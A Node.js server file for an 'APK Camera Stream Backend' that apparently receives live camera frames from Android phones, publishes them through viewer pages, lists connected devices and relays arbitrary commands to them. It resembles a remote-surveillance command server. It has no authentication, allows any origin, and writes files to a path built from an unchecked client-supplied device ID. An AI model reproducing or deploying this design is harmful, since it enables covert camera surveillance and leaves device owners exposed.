const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// ============================================
// STORAGE
// ============================================
let connectedDevices = [];
let latestFrames = {};

// Create HLS directory if not exists
const hlsDir = path.join(__dirname, 'hls');
if (!fs.existsSync(hlsDir)) {
  fs.mkdirSync(hlsDir);
}

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Serve HLS files
app.use('/hls', express.static(hlsDir));

// ============================================
// 🔴 VIDEO STREAM PAGE (REAL VIDEO PLAYER)
// ============================================
app.get('/video', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Video Stream</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #000;
                font-family: Arial, sans-serif;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                width: 100%;
                max-width: 800px;
                margin: 0 auto;
                padding: 16px;
            }
            .video-box {
                background: #0a0a0a;
                border-radius: 20px;
                overflow: hidden;
                box-shadow: 0 0 30px rgba(0,255,136,0.2);
            }
            video {
                width: 100%;
                height: auto;
                display: block;
                background: #000;
            }
            .info {
                background: rgba(0,0,0,0.8);
                padding: 12px;
                text-align: center;
                color: #00ff88;
                font-size: 14px;
                font-family: monospace;
            }
            .status {
                display: inline-block;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                background: #00ff88;
                animation: pulse 1.5s infinite;
                margin-right: 8px;
            }
            @keyframes pulse {
                0% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.5; transform: scale(0.8); }
                100% { opacity: 1; transform: scale(1); }
            }
            .device-id {
                background: #1a1a1a;
                padding: 8px 12px;
                border-radius: 10px;
                margin-top: 12px;
                text-align: center;
                color: #888;
                font-size: 12px;
            }
            input, button {
                padding: 10px;
                margin: 10px;
                font-size: 14px;
                border-radius: 8px;
                border: none;
            }
            input {
                background: #1a1a1a;
                color: white;
                width: 200px;
            }
            button {
                background: #00ff88;
                color: black;
                cursor: pointer;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="video-box">
                <video id="videoPlayer" autoplay muted controls playsinline></video>
                <div class="info">
                    <span class="status"></span>
                    <span id="statusText">CONNECTING...</span>
                </div>
            </div>
            <div class="device-id" id="deviceIdDisplay">Device ID: Loading...</div>
            <div style="text-align:center; margin-top:16px;">
                <input type="text" id="deviceInput" placeholder="Enter Device ID">
                <button onclick="loadStream()">LOAD STREAM</button>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
        <script>
            let currentDeviceId = null;
            let hls = null;
            const video = document.getElementById('videoPlayer');
            
            function loadStream() {
                const input = document.getElementById('deviceInput');
                currentDeviceId = input.value;
                
                if(!currentDeviceId) {
                    alert('Enter Device ID');
                    return;
                }
                
                document.getElementById('deviceIdDisplay').innerHTML = '📱 Device ID: ' + currentDeviceId;
                document.getElementById('statusText').innerHTML = '🟢 LOADING STREAM...';
                
                // HLS stream URL
                const streamUrl = '/stream/' + currentDeviceId + '.m3u8';
                
                if (Hls.isSupported()) {
                    if (hls) {
                        hls.destroy();
                    }
                    hls = new Hls();
                    hls.loadSource(streamUrl);
                    hls.attachMedia(video);
                    hls.on(Hls.Events.MANIFEST_PARSED, () => {
                        video.play();
                        document.getElementById('statusText').innerHTML = '🟢 LIVE VIDEO STREAMING';
                    });
                    hls.on(Hls.Events.ERROR, (event, data) => {
                        console.error('HLS error:', data);
                        document.getElementById('statusText').innerHTML = '🔴 STREAM ERROR';
                    });
                } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
                    video.src = streamUrl;
                    video.addEventListener('loadedmetadata', () => {
                        video.play();
                        document.getElementById('statusText').innerHTML = '🟢 LIVE VIDEO STREAMING';
                    });
                }
            }
            
            // Auto load from URL param
            const urlParams = new URLSearchParams(window.location.search);
            const deviceParam = urlParams.get('device_id');
            if(deviceParam) {
                document.getElementById('deviceInput').value = deviceParam;
                loadStream();
            }
        </script>
    </body>
    </html>
  `);
});

// ============================================
// 🔴 SIMPLE STREAM PAGE (MJPEG - FALLBACK)
// ============================================
app.get('/live', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>MJPEG Stream</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: black; text-align: center; }
            img { width: 100%; max-width: 600px; margin: 20px auto; display: block; }
        </style>
    </head>
    <body>
        <img id="stream" src="">
        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const deviceId = urlParams.get('device_id');
            if(deviceId) {
                const img = document.getElementById('stream');
                setInterval(() => {
                    img.src = '/api/frame.jpg?device_id=' + deviceId + '&t=' + Date.now();
                }, 100);
            }
        </script>
    </body>
    </html>
  `);
});

// ============================================
// 🔴 HLS STREAM SEGMENTER (Converts frames to video)
// ============================================
let segmentCounters = {};

function addFrameToHLS(deviceId, frameData) {
  // Store latest frame for MJPEG
  latestFrames[deviceId] = {
    data: frameData,
    time: Date.now()
  };
  
  // For HLS, we need to create TS segments
  // This is simplified - for production use ffmpeg
  if (!segmentCounters[deviceId]) {
    segmentCounters[deviceId] = 0;
  }
  
  // Save frame as JPEG for HLS conversion
  let base64Data = frameData;
  if (base64Data.includes(',')) {
    base64Data = base64Data.split(',')[1];
  }
  
  const imgBuffer = Buffer.from(base64Data, 'base64');
  const framePath = path.join(hlsDir, `${deviceId}_frame_${segmentCounters[deviceId]}.jpg`);
  fs.writeFileSync(framePath, imgBuffer);
  segmentCounters[deviceId]++;
  
  // Keep only last 10 frames
  if (segmentCounters[deviceId] > 10) {
    const oldFrame = path.join(hlsDir, `${deviceId}_frame_${segmentCounters[deviceId] - 11}.jpg`);
    if (fs.existsSync(oldFrame)) fs.unlinkSync(oldFrame);
  }
}

// ============================================
// 🔴 MJPEG ENDPOINT (for Vercel img tag)
// ============================================
app.get('/api/frame.jpg', (req, res) => {
  const deviceId = req.query.device_id;
  
  if (!deviceId) {
    return res.status(400).send('device_id missing');
  }
  
  const frame = latestFrames[deviceId];
  
  if (!frame || !frame.data) {
    return res.status(404).send('No frame available');
  }
  
  let base64Data = frame.data;
  if (base64Data.includes(',')) {
    base64Data = base64Data.split(',')[1];
  }
  
  const imgBuffer = Buffer.from(base64Data, 'base64');
  
  res.writeHead(200, {
    'Content-Type': 'image/jpeg',
    'Content-Length': imgBuffer.length,
    'Cache-Control': 'no-cache, no-store, must-revalidate'
  });
  res.end(imgBuffer);
});

// ============================================
// 🔴 DEVICES API
// ============================================
app.get('/api/devices', (req, res) => {
  const devicesList = connectedDevices.map(device => ({
    device_id: device.id,
    device_name: device.name,
    status: "online"
  }));
  
  res.json({
    success: true,
    total: connectedDevices.length,
    devices: devicesList
  });
});

// ============================================
// 🔴 COMMAND API
// ============================================
app.get('/api/command', (req, res) => {
  const command = req.query.cmd;
  const deviceId = req.query.device_id;
  
  if (!deviceId) {
    return res.json({ success: false, error: "No device selected" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if (targetDevice) {
    io.to(targetDevice.socket_id).emit('command', command);
    console.log(`🎮 Command '${command}' → ${targetDevice.name}`);
    res.json({ success: true, command: command });
  } else {
    res.json({ success: false, error: "Device not found" });
  }
});

// ============================================
// 🔴 QUALITY API
// ============================================
app.get('/api/quality', (req, res) => {
  const quality = req.query.quality;
  const deviceId = req.query.device_id;
  
  if (!deviceId || !quality) {
    return res.json({ success: false, error: "Missing device or quality" });
  }
  
  const targetDevice = connectedDevices.find(d => d.id === deviceId);
  
  if (targetDevice) {
    io.to(targetDevice.socket_id).emit('quality', quality);
    console.log(`🎥 Quality '${quality}' → ${targetDevice.name}`);
    res.json({ success: true, quality: quality });
  } else {
    res.json({ success: false, error: "Device not found" });
  }
});

// ============================================
// 🔴 HOME API
// ============================================
app.get('/', (req, res) => {
  res.json({
    message: "APK Camera Stream Backend is Running",
    version: "3.0",
    online_devices: connectedDevices.length,
    video_stream_url: "/video?device_id=YOUR_DEVICE_ID",
    mjpeg_stream_url: "/live?device_id=YOUR_DEVICE_ID",
    mjpeg_endpoint: "/api/frame.jpg?device_id=xxx",
    endpoints: {
      devices: "/api/devices",
      frame: "/api/frame.jpg?device_id=xxx",
      command: "/api/command?cmd=xxx&device_id=xxx",
      quality: "/api/quality?quality=xxx&device_id=xxx",
      video_stream: "/video?device_id=YOUR_DEVICE_ID",
      mjpeg_stream: "/live?device_id=YOUR_DEVICE_ID"
    }
  });
});

// ============================================
// 🔴 WEBSOCKET (APK CONNECTION + BROADCAST)
// ============================================
io.on('connection', (socket) => {
  console.log('✅ APK Connected:', socket.id);
  
  let currentDevice = null;
  
  socket.on('register_device', (data) => {
    const deviceId = data.device_id || data.device || socket.id;
    const deviceName = data.device_name || data.model || "Android Phone";
    
    currentDevice = {
      id: deviceId,
      name: deviceName,
      socket_id: socket.id,
      connected_at: new Date().toISOString()
    };
    
    connectedDevices = connectedDevices.filter(d => d.id !== deviceId);
    connectedDevices.push(currentDevice);
    
    console.log(`\n📱 DEVICE ONLINE:`);
    console.log(`   Name: ${deviceName}`);
    console.log(`   ID: ${deviceId}`);
    console.log(`   Total devices: ${connectedDevices.length}\n`);
  });
  
  // 🔴 FRAME RECEIVE - STORE + BROADCAST
  socket.on('frame', (frameData) => {
    if (currentDevice) {
      // Store for MJPEG and HLS
      addFrameToHLS(currentDevice.id, frameData);
      
      // Broadcast to web clients (MJPEG)
      socket.broadcast.emit('frame_update', {
        device_id: currentDevice.id,
        frame: frameData
      });
    }
  });
  
  socket.on('disconnect', () => {
    if (currentDevice) {
      console.log(`\n🔴 DEVICE OFFLINE:`);
      console.log(`   Name: ${currentDevice.name}`);
      console.log(`   ID: ${currentDevice.id}`);
      
      connectedDevices = connectedDevices.filter(d => d.id !== currentDevice.id);
      delete latestFrames[currentDevice.id];
      
      console.log(`   Total devices: ${connectedDevices.length}\n`);
    }
  });
});

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`
  ═══════════════════════════════════════════════════════
  🚀 COMPLETE STREAMING SERVER STARTED (VIDEO + MJPEG)
  ═══════════════════════════════════════════════════════
  
  📡 Port: ${PORT}
  
  🔴 VIDEO STREAM (HLS - Real Video Player):
     → /video?device_id=YOUR_DEVICE_ID
  
  🔴 MJPEG STREAM (Image Slideshow):
     → /live?device_id=YOUR_DEVICE_ID
  
  🔴 MJPEG ENDPOINT (for Vercel):
     → /api/frame.jpg?device_id=xxx
  
  🔴 APIs:
     → GET /api/devices
     → GET /api/command?cmd=xxx&device_id=xxx
     → GET /api/quality?quality=xxx&device_id=xxx
  
  ═══════════════════════════════════════════════════════
  `);
});
